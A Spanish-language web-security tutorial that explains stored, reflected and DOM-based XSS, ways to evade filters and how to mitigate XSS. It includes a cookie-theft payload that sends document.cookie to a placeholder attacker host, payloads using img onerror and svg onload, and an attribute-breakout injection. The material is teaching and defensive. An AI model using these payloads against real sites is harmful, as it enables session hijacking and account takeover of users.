-- -
# 1. ¿Qué es Cross-Site Scripting?

El XSS ocurre cuando una aplicación web **incluye datos no confiables o maliciosos proporcionados por un usuario dentro de la página HTML que envía al navegador**, sin haberlos sanitizado o codificado correctamente.

Esto permite a un auditor (o atacante) inyectar código JavaScript que el navegador de la víctima interpretará y ejecutará de forma automática, pensando que es código legítimo de la propia página web.
### ¿Por qué es tan peligroso JavaScript en el navegador?

Si logras ejecutar JavaScript en el navegador de una víctima bajo el dominio de la web auditada (por ejemplo, `banco.com`), puedes:

1. **Robar Cookies de Sesión:** Acceder a `document.cookie` para secuestrar la cuenta de la víctima (Session Hijacking).
2. **Defacement:** Modificar visualmente la página web usando el DOM (inyectar formularios falsos de inicio de sesión).
3. **Keylogging:** Capturar las pulsaciones de teclado del usuario en tiempo real.
4. **Forzar Acciones:** Hacer que la víctima envíe dinero, cambie su contraseña o realice peticiones sin su consentimiento.
# 2. Los Tres Tipos Principales de XSS

Como auditor web, debes identificar qué tipo de XSS estás explotando, ya que su impacto y la forma de reportarlo varían notablemente.
### A. Stored XSS (XSS Persistente o Almacenado)

Es el tipo más destructivo. Ocurre cuando el payload de JavaScript **se guarda de forma permanente en la base de datos del servidor** (por ejemplo, en un comentario de un blog, un foro, el nombre de perfil de un usuario o una dirección de envío).
#### El flujo:

1. El auditor inyecta el script en un formulario de comentarios: `<script>alert(1)</script>`.
2. El servidor guarda ese comentario tal cual en la base de datos.
3. Cada vez que **cualquier usuario** o administrador entra a leer ese artículo, el servidor recupera el comentario de la base de datos y lo renderiza en el HTML.
4. El navegador de todos los visitantes ejecuta el JavaScript automáticamente.
#### Payload para robo silencioso de cookie de sesión (Sesión Hijacked)

```HTML
<script>
	// Creamos un elemento de imagen en memoria (no se dibuja en la web)
	var i = new Image();
	// Le asignamos como fuente de la imagen nuestra IP del servidor atacante
	i.src = "http://IP_ATACANTE/log?cookie=" + encodeURIComponent(document.cookie);
</script>
```
### B. Reflected XSS (XSS Reflejado o No Persistente)

Ocurre cuando el payload de JavaScript **forma parte de la propia petición HTTP** (habitualmente en un parámetro de la URL o en un campo de búsqueda) y el servidor lo "refleja" inmediatamente en la respuesta sin guardarlo en ningún sitio.
#### El flujo:

1. Una web tiene un buscador: `http://vulnerable.com/search.php?q=camisas`.
2. La página web muestra en pantalla: _Resultados de búsqueda para: camisas_.
3. El auditor modifica la URL: `http://vulnerable.com/search.php?q=<script>alert(1)</script>`.
4. El servidor toma el parámetro `q` y lo mete directamente en el HTML de respuesta. El navegador ejecuta el script.

**Ingeniería Social:** Para que este ataque afecte a una víctima, el atacante debe convencerla (vía phishing, chat, etc.) de que haga clic en ese enlace malicioso específico.
### C. DOM-Based XSS (XSS Basado en el DOM)

Este tipo es especial y suele confundir a los principiantes. En el XSS Almacenado y Reflejado, el servidor web es el que mete el payload en el HTML. En el **DOM-Based XSS, el servidor web no tiene nada que ver; el payload nunca viaja al servidor en el código HTML de respuesta**.

La vulnerabilidad está completamente en el código **JavaScript del lado del cliente (Front-end)**, el cual toma un dato del navegador y lo procesa de forma insegura.
#### Conceptos clave:

- **Source (Fuente):** Es la propiedad de JavaScript que el usuario puede controlar (ej. `location.search`, `location.hash`, `document.URL`).
- **Sink (Receptor/Sumidero):** Es la función de JavaScript que ejecuta o renderiza el código (ej. `eval()`, `document.write()`, `element.innerHTML`).
#### Código Front-end Vulnerable:

```JavaScript
// La URL es http://site.com/welcome.html#Juan
var nombre = decodeURIComponent(window.location.hash_substring(1));
// Sink peligroso que interpreta HTML/JS
document.write("Bienvenido " + nombre);
```

Si el auditor navega a `http://site.com/welcome.html#<img src=x onerror=alert(1)>`, el script de la página leerá el hash de la URL y lo meterá en `document.write()`, ejecutando el payload completamente dentro del navegador, sin interactuar con el backend del servidor.
# 3. Metodología de Detección y Construcción de Payloads

Muchos entornos tienen Firewalls (WAF) que bloquean la etiqueta clásica `<script>`. Un auditor profesional debe conocer formas alternativas de invocar JavaScript abusando de los eventos de HTML.
### Eventos HTML comunes para evadir filtros:

1. Etiqueta `<img>` con error:

```HTML
<img src="ruta_que_no_existe.jpg" onerror="alert(document.cookie)">
```

_Explicación:_ El navegador intenta cargar la imagen, falla, y dispara inmediatamente el evento `onerror`, ejecutando el JavaScript.

2. Etiqueta `<svg>` al cargar:

```HTML
<svg onload="alert(1)">
```

3. Atributos de enfoque (Focus):

```HTML
<input autofocus onfocus="alert(1)">
```
### Cómo auditar un parámetro contra XSS:

1. **Identificar el contexto de reflejo:** Introduce un string único (ej: `PENTEST123`) en el campo y mira el código fuente de la página (`Ctrl + U`) para ver exactamente dónde cae.
2. **Contexto HTML entre etiquetas:** Si cae así: `<div>PENTEST123</div>`, simplemente abres una nueva etiqueta: `<div><script>alert(1)</script></div>`.
3. **Contexto dentro de un atributo:** Si tu input cae dentro del valor de un atributo: `<input type="text" name="buscar" value="PENTEST123">`.

	- Primero debes **romper el atributo** cerrando la comilla y la etiqueta: `"><script>alert(1)</script>`.
	- Consulta final resultante: `<input type="text" name="buscar" value=""><script>alert(1)</script>">`.
# 4. Mitigación de XSS

El XSS no se soluciona eliminando palabras con listas negras (como borrar la palabra "script"), ya que hay infinitas formas de evadirlo. Las defensas correctas son:

1. **Context-Aware Output Encoding (Codificación de salida según el contexto):** Convertir los caracteres especiales de HTML en entidades seguras _justo antes_ de pintarlos en la pantalla.

	- El carácter `<` se convierte en `&lt;`
	- El carácter `>` se convierte en `&gt;`
	- El carácter `"` se convierte en `&quot;`
	Al hacer esto, el navegador dibuja el símbolo en la pantalla pero **no lo interpreta como código ejecutable**.
2. **Implementar CSP (Content Security Policy):** Es una cabecera HTTP que le dice al navegador qué fuentes de JavaScript están permitidas (ej: _"Solo ejecuta scripts que vengan de mi propio servidor, prohíbe los scripts inline `<script>` y prohíbe la función `eval()`"_).
3. **Cookies con directiva `HttpOnly`:** No previene el XSS, pero mitiga drásticamente su impacto. Si una cookie tiene el flag `HttpOnly`, **JavaScript no puede acceder a ella** (`document.cookie` devolverá vacío), impidiendo que el atacante robe la sesión.
-- -
